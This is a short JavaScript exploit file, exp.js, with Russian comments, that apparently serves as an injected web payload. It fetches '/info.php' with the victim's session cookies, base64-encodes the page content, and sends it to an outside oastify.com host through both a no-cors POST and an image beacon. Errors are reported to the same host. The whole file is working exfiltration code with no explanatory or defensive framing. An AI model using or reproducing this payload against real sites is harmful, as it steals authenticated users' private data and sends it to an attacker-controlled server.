// exp.js - эксплойт для кражи содержимого /profile
const attackerURL = 'https://nsjahafoludl4h8s7q4ieieib9h85zto.oastify.com';

// Выполняем запрос к защищенной странице
fetch('/info.php', {
    credentials: 'include' // Важно: отправляем куки авторизации
})
.then(response => response.text())
.then(data => {
    // Кодируем содержимое в base64
    const base64Data = btoa(unescape(encodeURIComponent(data)));
    
    // Отправляем данные на сервер злоумышленника
    fetch(`${attackerURL}/exfil`, {
        method: 'POST',
        mode: 'no-cors',
        body: base64Data
    });
    
    // Дополнительный метод отправки через изображение
    new Image().src = `${attackerURL}?data=${encodeURIComponent(base64Data)}`;
})
.catch(error => {
    // Отправляем ошибки на сервер
    new Image().src = `${attackerURL}?error=${encodeURIComponent(error.message)}`;
});
